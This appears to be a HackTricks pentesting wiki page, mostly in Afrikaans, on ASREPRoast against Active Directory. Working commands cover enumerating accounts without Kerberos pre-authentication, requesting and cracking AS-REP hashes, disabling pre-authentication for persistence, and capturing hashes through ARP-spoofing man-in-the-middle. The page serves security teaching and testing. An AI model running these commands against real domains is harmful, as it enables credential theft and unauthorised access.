# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers teiken wat die **Kerberos pre-authentication vereiste attribuut** ontbreek. Essensieel stel hierdie kwesbaarheid aanvallers in staat om 'n versoek vir verifikasie vir 'n gebruiker van die Domeinbeheerder (DC) te doen sonder om die gebruiker se wagwoord te benodig. Die DC antwoord dan met 'n boodskap wat geënkripteer is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers kan probeer om offline te kraak om die gebruiker se wagwoord te ontdek.

Die hoofvereistes vir hierdie aanval is:

- **Ontbreking van Kerberos pre-authentication**: Teiken gebruikers moet nie hierdie sekuriteitskenmerk geaktiveer hê nie.
- **Verbinding met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en geënkripteerde boodskappe te ontvang.
- **Opsionele domeinrekening**: Om 'n domeinrekening te hê, stel aanvallers in staat om kwesbare gebruikers meer doeltreffend te identifiseer deur middel van LDAP-navrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Versoek AS_REP boodskap
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n versleutelingstipe van 0x17 en 'n preauth-tipe van 0.

### Kraking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Volharding

Force **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast sonder geloofsbriewe

'n Aanvaller kan 'n man-in-the-middle posisie gebruik om AS-REP pakkette te vang terwyl hulle die netwerk oorsteek sonder om op Kerberos voor-authentisering staat te maak om gedeaktiveer te wees. Dit werk dus vir alle gebruikers op die VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) stel ons in staat om dit te doen. Boonop dwing die hulpmiddel kliënt werkstasies om RC4 te gebruik deur die Kerberos onderhandeling te verander.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
